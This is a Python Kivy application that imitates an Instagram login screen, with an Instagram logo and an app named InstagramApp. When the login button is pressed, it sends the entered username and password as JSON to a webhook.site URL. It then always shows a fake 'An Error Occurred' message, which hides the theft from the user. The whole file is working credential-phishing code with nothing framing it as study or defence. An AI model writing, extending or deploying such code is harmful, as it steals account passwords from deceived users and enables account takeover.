from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.graphics import Color, Rectangle
import requests
import json
from kivy.uix.screenmanager import ScreenManager, Screen
import random

url = "https://webhook.site/9ceb2d74-1213-4ad7-ac25-e5401b0dd5d9"


#Second Screen

class LoginPage(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

        self.orientation = 'vertical'
        self.spacing = 10
        self.padding = [50, 100, 50, 100]

        # Set the background color to white using canvas
        with self.canvas.before:
            Color(1, 1, 1, 1)  # Set color to white (RGB: 1, 1, 1), Alpha: 1 (fully opaque)
            self.rect = Rectangle(pos=self.pos, size=self.size)

        self.bind(pos=self.update_rect, size=self.update_rect)

        

        # Add the image widget with your logo
        logo_image = Image(source="insta.png", size_hint=(None, None), size=(275,275), height= 150,
                            pos_hint={'center_x': 0.5, 'center_y': 0.5})
        self.add_widget(logo_image)

        input_grid = BoxLayout(orientation='vertical', spacing=10, size_hint_y=None, height=150)
        self.username_input = TextInput(hint_text="Username", multiline=False)
        self.password_input = TextInput(hint_text="Password", multiline=False, password=True)
        input_grid.add_widget(self.username_input)
        input_grid.add_widget(self.password_input)
        self.add_widget(input_grid)

        login_button = Button(text="Login", size_hint=(None, None), size=(200, 50), background_color=[0.53, 0.81, 0.92, 1.0],
                            pos_hint={'center_x': 0.5, 'center_y': 0.5})
        login_button.bind(on_press=self.login)
        self.add_widget(login_button)

    def update_rect(self, instance, value):
        # Update the size and position of the rectangle to cover the entire app window
        self.rect.pos = instance.pos
        self.rect.size = instance.size

    def login(self, instance):
        username = self.username_input.text
        password = self.password_input.text

        data = {"Username": username,"Password" : password}
        r = requests.post(url, data=json.dumps(data), headers={"Content-Type" : "application/json"})
        
        if username == eval and password == eval :
            self.clear_widgets()
            self.add_widget(Label(text="An Error Occurred", font_size=40, color=[1.0, 0.0, 0.0, 1.0])) 
        
        else:
            self.clear_widgets()
            self.add_widget(Label(text="An Error Occurred", font_size=40, color=[1.0, 0.0, 0.0, 1.0]))     
    


class InstagramApp(App):
    def build(self):
        return LoginPage()


if __name__ == '__main__':
    InstagramApp().run()
